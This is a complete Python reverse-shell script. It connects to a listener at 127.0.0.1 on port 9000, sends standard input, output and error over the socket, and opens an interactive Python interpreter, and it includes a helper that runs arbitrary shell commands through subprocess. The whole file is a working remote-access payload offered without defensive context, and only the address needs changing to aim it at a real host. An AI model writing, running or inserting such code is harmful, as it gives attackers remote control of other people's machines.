import socket, os, subprocess, code, sys, time

class MySocket(socket.socket):
    def __init__(self, *args):
        socket.socket.__init__(self, *args)
    def write(self, text):
        return self.send(text.encode())
    def readline(self):
        return self.recv(2048).decode()

def execute(cmd):
    ph = subprocess.Popen(cmd,shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
    results, errors = ph.communicate()
    results = results + errors
    return results
        
s = MySocket()
s.connect(("127.0.0.1", 9000))
sys.stdout=sys.stdin=sys.stderr=s
code.interact("Welcome to pyterpreter",local=locals())

